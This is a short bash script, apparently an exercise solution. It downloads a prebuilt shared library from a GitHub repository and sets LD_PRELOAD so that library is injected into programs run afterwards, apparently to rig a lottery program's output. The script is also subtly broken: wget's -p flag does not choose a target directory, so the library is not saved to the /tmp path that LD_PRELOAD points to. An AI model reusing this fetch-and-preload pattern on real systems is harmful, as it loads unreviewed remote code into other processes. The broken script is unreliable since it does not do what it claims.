#!/bin/bash
wget -p /tmp  https://github.com/mohammedchakir/alx-low_level_programming/raw/master/0x18-dynamic_libraries/randomgiga.so
export LD_PRELOAD=/tmp/randomgiga.so 
